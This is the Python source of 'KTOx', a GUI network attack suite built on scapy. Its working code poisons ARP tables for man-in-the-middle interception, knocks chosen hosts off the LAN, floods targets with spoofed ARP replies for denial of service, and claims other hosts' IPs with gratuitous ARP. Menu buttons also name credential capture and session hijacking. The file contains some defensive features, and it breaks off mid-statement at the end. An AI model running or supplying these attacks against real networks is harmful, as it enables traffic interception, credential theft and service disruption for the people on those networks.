#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox_gui.py — KTOx GUI | Cyberpunk Blood-Red | CustomTkinter

import os, sys, threading, time, socket, json, math, random
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext

try:
    import customtkinter as ctk
except ImportError:
    # Try to find customtkinter in a venv relative to this script
    import subprocess, site
    script_dir = os.path.dirname(os.path.abspath(__file__))
    venv_paths = [
        os.path.join(script_dir, "venv"),
        os.path.join(script_dir, ".venv"),
        os.path.expanduser("~/KTOx/venv"),
        os.path.expanduser("~/ktox/venv"),
    ]
    injected = False
    for vp in venv_paths:
        for pyver in ["python3.13","python3.12","python3.11","python3.10","python3.9"]:
            sp = os.path.join(vp, "lib", pyver, "site-packages")
            if os.path.isdir(sp):
                sys.path.insert(0, sp)
                try:
                    import customtkinter as ctk
                    injected = True
                    break
                except ImportError:
                    sys.path.pop(0)
        if injected:
            break
    if not injected:
        print("ERROR: customtkinter not found.")
        print("")
        print("It is installed in your venv but sudo uses system Python.")
        print("Fix with ONE of these options:")
        print("")
        print("  Option 1 — run using venv python directly:")
        print("    sudo ./venv/bin/python3 ktox.py --gui")
        print("")
        print("  Option 2 — install into system Python:")
        print("    sudo pip3 install customtkinter --break-system-packages")
        print("")
        sys.exit(1)

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
    from scapy.config import conf as sconf
    sconf.ipv6_enabled = False
    import nmap
    import scan, spoof
except ImportError as e:
    print(f"ERROR: Missing dependency — {e}")
    sys.exit(1)

# ── Palette ───────────────────────────────────────────────────────────────────
BG_DARK   = "#090909"
BG_PANEL  = "#0F0F0F"
BG_CARD   = "#141414"
BG_INPUT  = "#1C1C1C"
FG_WHITE  = "#EFEFEF"
FG_ASH    = "#7A7A7A"
FG_DIM    = "#3A3A3A"
RED_BLOOD = "#C0392B"
RED_EMBER = "#E74C3C"
RED_RUST  = "#7B241C"
RED_HOT   = "#FF3319"
ORANGE    = "#CA6F1E"
GREEN     = "#1E8449"
YELLOW    = "#D4AC0D"

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# ── Globals ───────────────────────────────────────────────────────────────────
hosts_list          = []
default_interface   = None
default_iface_mac   = None
default_gateway_ip  = None
default_gateway_mac = None
stop_flag           = threading.Event()
LOG_FILE            = None

_OUI = {
    "B8:27:EB":"Raspberry Pi","DC:A6:32":"Raspberry Pi","E4:5F:01":"Raspberry Pi",
    "28:CD:C1":"Raspberry Pi","00:50:56":"VMware","00:0C:29":"VMware",
    "08:00:27":"VirtualBox","00:15:5D":"Microsoft","00:1A:11":"Google",
    "54:60:09":"Google","F4:F5:D8":"Google","74:44:01":"Amazon",
    "FC:A6:67":"Amazon","40:B4:CD":"Amazon","18:B4:30":"Nest",
    "00:17:88":"Philips Hue","B0:4E:26":"Huawei","00:18:82":"Huawei",
    "00:26:5A":"Netgear","C0:3F:0E":"Netgear","20:4E:7F":"Netgear",
    "00:18:E7":"TP-Link","F4:F2:6D":"TP-Link","50:C7:BF":"TP-Link",
    "00:1A:2B":"Asus","90:E6:BA":"Asus","AC:22:0B":"Asus","2C:FD:A1":"Asus",
    "00:04:ED":"Ubiquiti","44:D9:E7":"Ubiquiti","68:72:51":"Ubiquiti",
    "80:2A:A8":"Ubiquiti","00:11:92":"D-Link","90:94:E4":"D-Link",
    "1C:7E:E5":"D-Link","00:23:AE":"Cisco","00:21:6A":"Cisco",
    "00:25:9C":"Cisco","00:1F:C6":"Samsung","30:19:66":"Samsung",
    "50:01:BB":"Samsung","00:17:F2":"Apple","00:1C:B3":"Apple",
    "B8:78:2E":"Apple","F8:27:93":"Apple","3C:07:54":"Apple",
    "A4:B1:97":"Apple","D0:25:98":"Apple","F0:18:98":"Apple",
    "00:22:6B":"Linksys","00:23:69":"Linksys","48:F8:B3":"Linksys",
}

def _resolve_vendor(mac):
    if not mac: return "—"
    return _OUI.get(mac.upper()[:8], "—")

def _resolve_hostname(ip):
    try:
        old = socket.getdefaulttimeout()
        socket.setdefaulttimeout(0.4)
        name = socket.gethostbyaddr(ip)[0]
        socket.setdefaulttimeout(old)
        return name[:20] if name != ip else "—"
    except:
        return "—"

def _retrieve_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return None

def _get_interface(return_net=False):
    def long2net(a):
        return 32 - int(round(math.log(0xFFFFFFFF - a, 2)))
    def cidr(bn, bm):
        net = scapy.utils.ltoa(bn)
        nm  = long2net(bm)
        return f"{net}/{nm}" if nm >= 16 else None
    routes = [r for r in scapy.config.conf.route.routes
              if r[3] == scapy.config.conf.iface and r[1] != 0xFFFFFFFF]
    nw, nm, _, iface, _, _ = max(routes, key=lambda x: x[1])
    net = cidr(nw, nm)
    if net:
        return net if return_net else iface

def _get_gateway():
    try:
        import netifaces
        gws = netifaces.gateways()
        gw = gws.get("default", {}).get(netifaces.AF_INET, [None])[0]
        if gw: return gw
    except: pass
    try:
        gw = scapy.config.conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0": return gw
    except: pass
    try:
        import subprocess as sp
        out = sp.check_output(["ip","route"], text=True)
        for line in out.splitlines():
            if line.startswith("default") and "via" in line:
                p = line.split()
                return p[p.index("via")+1]
    except: pass
    return "unknown"

def _init_log():
    global LOG_FILE
    os.makedirs("ktox_loot", exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    LOG_FILE = os.path.join("ktox_loot", f"gui_{ts}.log")

def _log_event(event, **kw):
    if not LOG_FILE: return
    entry = {"ts": datetime.now().isoformat(), "event": event, "data": kw}
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except: pass


# ── App ───────────────────────────────────────────────────────────────────────
class KTOxApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("KTOx  —  Network Penetration & Purple Team Suite")

        # Detect screen size and set geometry to 95% of screen
        self.update_idletasks()
        sw = self.winfo_screenwidth()
        sh = self.winfo_screenheight()
        w  = max(600, int(sw * 0.95))
        h  = max(400, int(sh * 0.92))
        x  = (sw - w) // 2
        y  = (sh - h) // 2
        self.geometry(f"{w}x{h}+{x}+{y}")
        self.minsize(480, 360)
        self.configure(fg_color=BG_DARK)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        # Scale fonts to screen width
        self._sf = max(0.6, min(1.2, sw / 1280))  # scale factor
        self._fs  = lambda n: max(7, int(n * self._sf))  # scaled font size

        self._attacking      = False
        self._attack_targets = []
        self._atk_thread     = None

        _init_log()
        self._build()
        self.bind("<Configure>", self._on_resize)
        self.after(300, self._auto_init)

    def _on_resize(self, event=None):
        """Rebalance left panel width on window resize."""
        try:
            w = self.winfo_width()
            # Left panel = 28% of window, min 160, max 280
            lw = max(160, min(280, int(w * 0.28)))
            self._left_frame.configure(width=lw)
            # Reflow tree columns
            self._resize_tree()
        except: pass

    def _resize_tree(self):
        """Distribute tree column widths to fill available space."""
        try:
            tw = self._tree_frame.winfo_width() - 20  # subtract scrollbar
            if tw < 100: return
            # proportional weights: #=3, IP=14, MAC=16, VENDOR=12, HOST=14, ST=4
            weights = [3, 14, 16, 12, 14, 4]
            total   = sum(weights)
            cols    = ("#","IP","MAC","VENDOR","HOST","ST")
            for col, wt in zip(cols, weights):
                cw = max(20, int(tw * wt / total))
                self._tree.column(col, width=cw)
        except: pass

    # ── Layout ────────────────────────────────────────────────────────────────
    def _build(self):
        fs = self._fs

        # Use grid for entire window so everything scales
        self.rowconfigure(0, weight=0)  # banner
        self.rowconfigure(1, weight=0)  # divider
        self.rowconfigure(2, weight=0)  # info bar
        self.rowconfigure(3, weight=0)  # divider
        self.rowconfigure(4, weight=1)  # body
        self.columnconfigure(0, weight=1)

        # Banner
        top = ctk.CTkFrame(self, fg_color=BG_DARK, corner_radius=0)
        top.grid(row=0, column=0, sticky="ew")
        top.columnconfigure(1, weight=1)
        ctk.CTkLabel(top, text="▐ KTOX ▌",
                     font=("Courier New", fs(18), "bold"),
                     text_color=RED_BLOOD).grid(row=0, column=0, padx=12, pady=4, sticky="w")
        ctk.CTkLabel(top, text="Network Penetration & Purple Team Suite  ·  authorized eyes only",
                     font=("Courier New", fs(9)), text_color=FG_ASH
                     ).grid(row=0, column=1, sticky="w")
        self._lbl_status = ctk.CTkLabel(top, text="● INIT",
                     font=("Courier New", fs(9), "bold"), text_color=ORANGE)
        self._lbl_status.grid(row=0, column=2, padx=12, sticky="e")

        ctk.CTkFrame(self, fg_color=RED_RUST, height=2,
                     corner_radius=0).grid(row=1, column=0, sticky="ew")

        # Info bar
        ibar = ctk.CTkFrame(self, fg_color=BG_PANEL, corner_radius=0)
        ibar.grid(row=2, column=0, sticky="ew")
        self._ib_iface = self._ibadge(ibar, "IFACE", "—")
        self._ib_gw    = self._ibadge(ibar, "GW",    "—")
        self._ib_mac   = self._ibadge(ibar, "MAC",   "—")
        self._ib_hosts = self._ibadge(ibar, "HOSTS", "0")
        self._ib_log   = self._ibadge(ibar, "LOG", os.path.basename(LOG_FILE or "—"))

        ctk.CTkFrame(self, fg_color=RED_RUST, height=1,
                     corner_radius=0).grid(row=3, column=0, sticky="ew")

        # Body
        body = ctk.CTkFrame(self, fg_color=BG_DARK, corner_radius=0)
        body.grid(row=4, column=0, sticky="nsew")
        body.rowconfigure(0, weight=1)
        body.columnconfigure(0, weight=0)
        body.columnconfigure(1, weight=1)

        sw   = self.winfo_screenwidth()
        lw   = max(160, min(280, int(sw * 0.22)))
        left = ctk.CTkScrollableFrame(body, fg_color=BG_PANEL,
                                      corner_radius=0, width=lw)
        left.grid(row=0, column=0, sticky="nsew")
        self._left_frame = left
        self._build_left(left)

        right = ctk.CTkFrame(body, fg_color=BG_DARK, corner_radius=0)
        right.grid(row=0, column=1, sticky="nsew", padx=(2,0))
        self._build_right(right)

    def _ibadge(self, parent, key, val):
        fs = self._fs
        f = ctk.CTkFrame(parent, fg_color=BG_PANEL, corner_radius=0)
        f.pack(side="left", padx=6, pady=2)
        ctk.CTkLabel(f, text=key+":", font=("Courier New", fs(8), "bold"),
                     text_color=RED_BLOOD).pack(side="left")
        lbl = ctk.CTkLabel(f, text=val, font=("Courier New", fs(8)),
                            text_color=FG_ASH)
        lbl.pack(side="left", padx=2)
        return lbl

    def _sect(self, parent, title):
        fs = self._fs
        ctk.CTkLabel(parent, text=f"─ {title} ─",
                     font=("Courier New", fs(8), "bold"),
                     text_color=RED_RUST).pack(anchor="w", padx=6, pady=(8,1))

    def _rbtn(self, parent, label, cmd, color=RED_RUST):
        fs = self._fs
        return ctk.CTkButton(parent, text=label,
            font=("Courier New", fs(9), "bold"),
            fg_color=color, hover_color=RED_BLOOD,
            text_color=FG_WHITE, border_color=RED_EMBER,
            border_width=1, corner_radius=2, command=cmd)

    def _build_left(self, p):
        fs = self._fs
        px = 6

        # ── Network ──
        self._sect(p, "NETWORK")
        self._rbtn(p, "⟳  SCAN NETWORK", self._do_scan).pack(fill="x", padx=px, pady=2)

        # ── Offensive ──
        self._sect(p, "── OFFENSIVE ──")
        self._mode = ctk.StringVar(value="kick_one")
        for lbl, val in [
            ("Kick ONE",           "kick_one"),
            ("Kick SOME",          "kick_some"),
            ("Kick ALL",           "kick_all"),
            ("MITM Poison",        "mitm"),
            ("ARP Flood [DoS]",    "flood"),
            ("ARP Reply Storm",    "storm"),
            ("Gratuitous ARP",     "garp"),
            ("Gateway DoS",        "gw_dos"),
            ("ARP Cage [Isolate]", "cage"),
        ]:
            ctk.CTkRadioButton(p, text=lbl, variable=self._mode, value=val,
                font=("Courier New", fs(9)), text_color=FG_ASH,
                fg_color=RED_BLOOD, hover_color=RED_EMBER,
                border_color=RED_RUST).pack(anchor="w", padx=px+4, pady=1)

        self._sect(p, "RATE (pkt/min)")
        self._rate = ctk.CTkEntry(p, font=("Courier New", fs(9)),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="6")
        self._rate.insert(0, "6")
        self._rate.pack(fill="x", padx=px, pady=2)

        self._sect(p, "PACKET CAP (0=∞)")
        self._cap = ctk.CTkEntry(p, font=("Courier New", fs(9)),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="0")
        self._cap.insert(0, "0")
        self._cap.pack(fill="x", padx=px, pady=2)

        self._sect(p, "GARP CLAIM IP")
        self._garp_ip = ctk.CTkEntry(p, font=("Courier New", fs(9)),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="IP to claim")
        self._garp_ip.pack(fill="x", padx=px, pady=2)

        self._sect(p, "TARGETS (idx / IP)")
        self._targets = ctk.CTkEntry(p, font=("Courier New", fs(9)),
            fg_color=BG_INPUT, border_color=RED_RUST,
            text_color=FG_WHITE, placeholder_text="0,1,2 or IP")
        self._targets.pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "◎ USE SELECTION",
                   self._use_selection, color="#1A1A1A").pack(fill="x", padx=px, pady=2)

        self._sect(p, "CONTROL")
        self._btn_launch = self._rbtn(p, "▶  LAUNCH ATTACK", self._launch)
        self._btn_launch.pack(fill="x", padx=px, pady=2)
        ctk.CTkButton(p, text="■  STOP & RE-ARP",
            font=("Courier New", fs(9), "bold"),
            fg_color=BG_INPUT, hover_color=RED_RUST,
            text_color=FG_ASH, border_color=RED_RUST,
            border_width=1, corner_radius=2,
            command=self._stop).pack(fill="x", padx=px, pady=2)

        # ── Recon ──
        self._sect(p, "── RECON ──")
        self._rbtn(p, "◎  ARP Request Scan",  self._arp_scan).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "◉  Target Recon",       self._recon).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "⚙  MAC Spoof",          self._mac_spoof).pack(fill="x", padx=px, pady=2)

        # ── Defensive ──
        self._sect(p, "── DEFENSIVE ──")
        self._rbtn(p, "⚡ ARP Watch",          self._arp_watch).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "📊 Live ARP Diff",       self._arp_diff).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🚨 Rogue Detector",      self._rogue_detect).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔒 ARP Hardening",       self._arp_harden).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "📋 Baseline Export",     self._baseline_export).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "▣  ARP Snapshot",        self._snapshot).pack(fill="x", padx=px, pady=2)

        # ── Advanced ──
        self._sect(p, "── ADVANCED ──")
        self._rbtn(p, "⚡ MITM Engine",         self._mitm_engine).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "💉 JS/HTML Injector",    self._js_inject).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔍 Proto Sniffer",        self._proto_sniff).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "📦 PCAP Capture",         self._pcap_capture).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔐 NTLMv2 Capture",       self._ntlm_capture).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🍪 Session Hijacker",      self._session_hijack).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "📜 Run Caplet",            self._run_caplet).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🌐 Web Dashboard",         self._web_dashboard).pack(fill="x", padx=px, pady=2)

        # ── Windows Attack Stack ──
        self._sect(p, "── WINDOWS STACK ──")
        self._rbtn(p, "📡 LLMNR/NBT-NS Poison",   self._llmnr_poison).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🌍 WPAD Rogue Proxy",        self._wpad_server).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "💻 Rogue SMB Server",         self._rogue_smb).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "⚡ Full Windows Stack",       self._win_stack).pack(fill="x", padx=px, pady=2)

        # ── Analysis ──
        self._sect(p, "── ANALYSIS ──")
        self._rbtn(p, "🗺  Topology Map",            self._topology_map).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "📄 Generate Report",          self._gen_report).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔓 Hash Cracker",             self._hash_crack).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔬 IoT Fingerprinter",        self._iot_fp).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🥷 Stealth Mode",              self._stealth_mode).pack(fill="x", padx=px, pady=2)

        # ── Purple Team ──
        self._sect(p, "── PURPLE TEAM ──")
        self._rbtn(p, "🛡 ARP Hardening",             self._defense_arp).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔇 Disable LLMNR",             self._defense_llmnr).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "✍ SMB Signing",               self._defense_smb).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔒 TLS Enforcement",           self._defense_tls).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔐 Encrypted DNS",             self._defense_dns).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "🔍 Cleartext Audit",           self._defense_creds).pack(fill="x", padx=px, pady=2)
        self._rbtn(p, "📋 Purple Team Audit",         self._defense_audit).pack(fill="x", padx=px, pady=2)

    def _build_right(self, parent):
        fs  = self._fs
        rh  = max(16, int(19 * self._sf))   # row height scales with screen

        parent.rowconfigure(0, weight=3)
        parent.rowconfigure(1, weight=2)
        parent.columnconfigure(0, weight=1)

        # Host table card
        tc = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=0)
        tc.grid(row=0, column=0, sticky="nsew", pady=(2,1))
        tc.rowconfigure(1, weight=1)
        tc.columnconfigure(0, weight=1)

        hdr = ctk.CTkFrame(tc, fg_color=BG_CARD, corner_radius=0)
        hdr.grid(row=0, column=0, sticky="ew", padx=6, pady=(4,0))
        ctk.CTkLabel(hdr, text="◈ HOST TABLE",
                     font=("Courier New", fs(10), "bold"),
                     text_color=RED_BLOOD).pack(side="left")
        ctk.CTkFrame(tc, fg_color=RED_RUST, height=1,
                     corner_radius=0).grid(row=0, column=0, sticky="ew",
                                           padx=4, pady=(24,0))

        tf = tk.Frame(tc, bg=BG_CARD)
        tf.grid(row=1, column=0, sticky="nsew", padx=4, pady=4)
        tf.rowconfigure(0, weight=1)
        tf.columnconfigure(0, weight=1)
        self._tree_frame = tf

        sty = ttk.Style()
        sty.theme_use("clam")
        sty.configure("K.Treeview",
            background=BG_CARD, fieldbackground=BG_CARD,
            foreground=FG_WHITE, rowheight=rh,
            font=("Courier New", fs(9)), borderwidth=0, relief="flat")
        sty.configure("K.Treeview.Heading",
            background=BG_DARK, foreground=RED_BLOOD,
            font=("Courier New", fs(9), "bold"), borderwidth=0, relief="flat")
        sty.map("K.Treeview",
            background=[("selected", RED_RUST)],
            foreground=[("selected", FG_WHITE)])

        cols = ("#","IP","MAC","VENDOR","HOST","ST")
        self._tree = ttk.Treeview(tf, columns=cols, show="headings",
                                  style="K.Treeview", selectmode="extended")
        # Initial widths — will be reflowed on resize
        for col, w in zip(cols, [28,115,135,100,110,36]):
            self._tree.heading(col, text=col)
            self._tree.column(col, width=w, minwidth=20, stretch=True, anchor="w")

        vsb = ttk.Scrollbar(tf, orient="vertical", command=self._tree.yview)
        self._tree.configure(yscrollcommand=vsb.set)
        self._tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")

        # Reflow columns whenever tree is resized
        self._tree.bind("<Configure>", lambda e: self.after(50, self._resize_tree))

        # Log pane
        lc = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=0)
        lc.grid(row=1, column=0, sticky="nsew", pady=(1,2))
        lc.rowconfigure(1, weight=1)
        lc.columnconfigure(0, weight=1)

        ctk.CTkLabel(lc, text="◈ OUTPUT",
                     font=("Courier New", fs(10), "bold"),
                     text_color=RED_BLOOD).grid(row=0, column=0,
                                                sticky="w", padx=8, pady=(4,0))
        ctk.CTkFrame(lc, fg_color=RED_RUST, height=1,
                     corner_radius=0).grid(row=0, column=0,
                                           sticky="ew", padx=4, pady=(22,0))

        self._out = scrolledtext.ScrolledText(lc,
            font=("Courier New", fs(9)), bg=BG_CARD, fg=FG_ASH,
            insertbackground=RED_BLOOD, relief="flat",
            borderwidth=0, state="disabled")
        self._out.grid(row=1, column=0, sticky="nsew", padx=4, pady=4)

        for tag, col in [("red",RED_EMBER),("green",GREEN),
                         ("yellow",YELLOW),("orange",ORANGE),
                         ("white",FG_WHITE),("dim",FG_DIM)]:
            self._out.tag_config(tag, foreground=col)

    # ── Output helpers ────────────────────────────────────────────────────────
    def _log(self, msg, tag="dim"):
        def _w():
            self._out.configure(state="normal")
            ts = datetime.now().strftime("%H:%M:%S")
            self._out.insert("end", f"[{ts}]  {msg}\n", tag)
            self._out.see("end")
            self._out.configure(state="disabled")
        self.after(0, _w)

    def _setstatus(self, txt, col=FG_ASH):
        self.after(0, lambda: self._lbl_status.configure(text=txt, text_color=col))

    # ── Init ──────────────────────────────────────────────────────────────────
    def _auto_init(self):
        def _run():
            global default_interface, default_gateway_ip, default_iface_mac
            self._setstatus("● DETECTING", ORANGE)
            try:
                default_interface = _get_interface()
                self._log(f"Interface: {default_interface}", "green")
                self.after(0, lambda: self._ib_iface.configure(text=default_interface))

                default_gateway_ip = _get_gateway()
                self._log(f"Gateway:   {default_gateway_ip}", "green")
                self.after(0, lambda: self._ib_gw.configure(text=default_gateway_ip))

                default_iface_mac = get_if_hwaddr(default_interface)
                self._log(f"MAC:       {default_iface_mac}", "green")
                self.after(0, lambda: self._ib_mac.configure(text=default_iface_mac))

                self._log("Scanning network...", "dim")
                self._scan_internal()
                self._setstatus("● READY", GREEN)
            except Exception as ex:
                self._log(f"Init error: {ex}", "red")
                self._setstatus("● ERROR", RED_EMBER)
        threading.Thread(target=_run, daemon=True).start()

    # ── Scan ──────────────────────────────────────────────────────────────────
    def _do_scan(self):
        def _run():
            self._setstatus("● SCANNING", ORANGE)
            self._log("Scanning...", "dim")
            self._scan_internal()
            self._setstatus("● READY", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    def _scan_internal(self):
        global hosts_list, default_gateway_mac
        try:
            hosts_list = scan.scanNetwork(_get_interface(True))
            default_gateway_mac = None
            for h in hosts_list:
                if h[0] == default_gateway_ip:
                    default_gateway_mac = h[1]
            if not default_gateway_mac and default_gateway_ip:
                default_gateway_mac = _retrieve_mac(default_gateway_ip)
            self._log(f"Found {len(hosts_list)} host(s).", "green")
            self.after(0, lambda: self._ib_hosts.configure(text=str(len(hosts_list))))
            self.after(0, self._fill_tree)
            _log_event("SCAN_COMPLETE", count=len(hosts_list))
        except Exception as ex:
            self._log(f"Scan error: {ex}", "red")

    def _fill_tree(self):
        self._tree.delete(*self._tree.get_children())
        for i, h in enumerate(hosts_list):
            ip  = h[0]; mac = h[1]
            gw  = ip == default_gateway_ip
            self._tree.insert("", "end",
                values=(i, ip, mac,
                        _resolve_vendor(mac),
                        _resolve_hostname(ip),
                        "GW" if gw else "OK"),
                tags=("gw" if gw else "ok",))
        self._tree.tag_configure("gw", foreground=YELLOW)
        self._tree.tag_configure("ok", foreground=FG_WHITE)

    # ── Target helpers ────────────────────────────────────────────────────────
    def _use_selection(self):
        sel = self._tree.selection()
        if not sel:
            self._log("No rows selected.", "orange"); return
        idxs = [self._tree.item(s,"values")[0] for s in sel]
        self._targets.delete(0,"end")
        self._targets.insert(0, ",".join(idxs))
        self._log(f"Targets: {','.join(idxs)}", "yellow")

    def _parse_targets(self, mode):
        if mode == "kick_all":
            return [(h[0],h[1]) for h in hosts_list if h[0] != default_gateway_ip]
        if mode == "garp": return []
        raw = self._targets.get().strip()
        if not raw:
            self._log("No targets specified.", "orange"); return None
        out = []
        for p in raw.split(","):
            p = p.strip()
            if p.isdigit():
                idx = int(p)
                if idx < len(hosts_list):
                    ip  = hosts_list[idx][0]
                    mac = hosts_list[idx][1] or _retrieve_mac(ip)
                    out.append((ip, mac))
            else:
                out.append((p, _retrieve_mac(p)))
        return out

    # ── Attack ────────────────────────────────────────────────────────────────
    def _launch(self):
        if self._attacking:
            self._log("Already attacking. Stop first.", "orange"); return
        if not hosts_list:
            self._log("Scan first.", "orange"); return

        mode = self._mode.get()
        try: ppm = int(self._rate.get() or "6")
        except: ppm = 6
        try: cap = int(self._cap.get() or "0")
        except: cap = 0

        if mode == "garp":   self._do_garp();              return
        if mode == "flood":  self._do_flood(ppm, cap);    return
        if mode == "storm":  self._do_storm(ppm, cap);    return
        if mode == "gw_dos": self._do_gw_dos(ppm, cap);  return
        if mode == "cage":   self._do_cage(ppm, cap);     return

        targets = self._parse_targets(mode)
        if not targets: return

        self._attack_targets = targets
        ip_str = ", ".join(ip for ip,_ in targets)
        self._log(f"▶ {mode.upper()}  →  {ip_str}  @{ppm}ppm", "red")
        _log_event("ATTACK_START", mode=mode, targets=ip_str)

        stop_flag.clear()
        self._attacking = True
        self._setstatus("● ATTACKING", RED_HOT)
        # interval per target so rate is accurate regardless of target count
        interval = 60.0 / float(ppm)
        cap_str = str(cap) if cap > 0 else "∞"
        self._log(f"  Rate: {ppm}ppm/target  Cap: {cap_str}", "dim")

        def _loop():
            sent = 0
            while not stop_flag.is_set():
                for ip, mac in targets:
                    if stop_flag.is_set(): break
                    if mac:
                        try:
                            if mode == "mitm":
                                gm = default_gateway_mac or _retrieve_mac(default_gateway_ip)
                                sendp(Ether(dst=mac)/ARP(op=2,
                                    pdst=ip, hwdst=mac,
                                    psrc=default_gateway_ip,
                                    hwsrc=default_iface_mac), verbose=False)
                                sendp(Ether(dst=gm)/ARP(op=2,
                                    pdst=default_gateway_ip, hwdst=gm,
                                    psrc=ip, hwsrc=default_iface_mac), verbose=False)
                            else:
                                spoof.sendPacket(default_iface_mac,
                                                 default_gateway_ip, ip, mac)
                            sent += 1
                            if cap > 0 and sent >= cap:
                                stop_flag.set()
                                self._log(f"Packet cap reached ({cap}).", "yellow")
                                break
                        except: pass
                    time.sleep(interval)
                self.after(0, lambda s=sent:
                    self._setstatus(f"● ATK {s}pkt", RED_HOT))
            _log_event("ATTACK_END", mode=mode, sent=sent)
        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    def _do_flood(self, ppm, cap=0):
        raw = self._targets.get().strip().split(",")[0].strip()
        if raw.isdigit():
            idx = int(raw)
            raw = hosts_list[idx][0] if idx < len(hosts_list) else raw
        target_ip  = raw
        target_mac = _retrieve_mac(target_ip)
        if not target_mac:
            self._log(f"Cannot resolve MAC for {target_ip}", "red"); return
        pps      = max(1, ppm * 10)
        interval = 1.0 / pps
        self._log(f"▶ ARP FLOOD  →  {target_ip}  @{pps}pps", "red")
        _log_event("FLOOD_START", target=target_ip, pps=pps)
        stop_flag.clear(); self._attacking = True
        self._setstatus("● FLOODING", RED_HOT)
        sent = [0]
        def _loop():
            while not stop_flag.is_set():
                fi = ".".join(str(random.randint(1,254)) for _ in range(4))
                fm = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                try:
                    sendp(Ether(dst=target_mac)/ARP(op=2,
                        pdst=target_ip, hwdst=target_mac,
                        psrc=fi, hwsrc=fm), verbose=False)
                    sent[0] += 1
                    if cap > 0 and sent[0] >= cap:
                        stop_flag.set()
                        self._log(f"Flood cap reached ({cap}).", "yellow")
                        break
                except: pass
                time.sleep(interval)
                if sent[0] % 100 == 0:
                    self.after(0, lambda s=sent[0]:
                        self._setstatus(f"● FLD {s}pkt", RED_HOT))
            _log_event("FLOOD_END", sent=sent[0])
        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    def _do_garp(self):
        ip = self._garp_ip.get().strip()
        if not ip:
            self._log("Enter CLAIM IP.", "orange"); return
        mac = default_iface_mac
        self._log(f"▶ GARP  →  {ip} is-at {mac}", "yellow")
        _log_event("GARP_START", claim_ip=ip)
        garp = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)/ARP(
            op=2, psrc=ip, hwsrc=mac, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        def _run():
            for i in range(10):
                try: sendp(garp, verbose=False)
                except: pass
                self._log(f"  GARP [{i+1}/10] → {ip}", "yellow")
                time.sleep(1.0)
            self._log("GARP complete.", "green")
        threading.Thread(target=_run, daemon=True).start()

    def _stop(self):
        if not self._attacking:
            self._log("No active attack.", "dim"); return
        stop_flag.set()
        self._attacking = False
        self._setstatus("● RE-ARPING", ORANGE)
        self._log("Stopping — restoring ARP tables...", "orange")
        targets = list(self._attack_targets)
        def _rearp():
            for _ in range(10):
                for ip, mac in targets:
                    if mac and default_gateway_mac:
                        try: spoof.sendPacket(default_gateway_mac,
                                              default_gateway_ip, ip, mac)
                        except: pass
                time.sleep(0.2)
            self._log("ARP tables restored.", "green")
            self._setstatus("● READY", GREEN)
            _log_event("REARP_COMPLETE")
            self._attack_targets = []
        threading.Thread(target=_rearp, daemon=True).start()

    # ── Passive ───────────────────────────────────────────────────────────────
    def _arp_watch(self):
        self._log("ARP Watch started — Ctrl+Stop to end.", "yellow")
        self._setstatus("● ARP WATCH", YELLOW)
        known = {}
        stop_flag.clear()
        def _sniff(pkt):
            if ARP in pkt and pkt[ARP].op == 2:
                ip  = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                if ip in known:
                    if known[ip] != mac:
                        self._log(f"⚡ CONFLICT  {ip}  {known[ip]}→{mac}", "red")
                        _log_event("ARP_CONFLICT", ip=ip, old=known[ip], new=mac)
                        known[ip] = mac
                else:
                    known[ip] = mac
                    self._log(f"  + {ip}  {mac}", "dim")
        def _run():
            sniff(prn=_sniff, filter="arp", store=0,
